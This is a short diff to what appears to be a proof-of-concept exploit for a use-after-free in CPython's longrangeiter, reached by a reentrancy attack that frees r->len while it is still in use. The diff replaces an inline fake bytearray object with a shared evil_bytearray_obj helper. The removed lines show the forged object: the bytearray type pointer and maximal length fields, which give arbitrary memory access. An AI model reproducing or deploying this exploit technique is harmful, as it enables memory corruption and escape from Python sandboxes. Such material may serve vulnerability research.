@@ -52,6 +52,8 @@ longrangeiter_setstate(PyObject *op, PyObject *state)
 # r->len is used plenty of times without incref'ing beforehand, and since most of these funcs can call python code,
 # we can abuse this to perform a reentrancy attack to free r->len before we're done using it
 
+from common import evil_bytearray_obj
+
 # create any longrangeiter object
 r = iter(range(2**80, 2**80+1))
 
@@ -115,15 +117,9 @@ class catch:
         return False
 
 # setup
-p64 = lambda num: num.to_bytes(8, 'little')
-fake_obj = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+
+# see ./common/common.py for evil bytearray obj explanation
+fake_obj, _ = evil_bytearray_obj()
 
 SIZE = 0x100
 
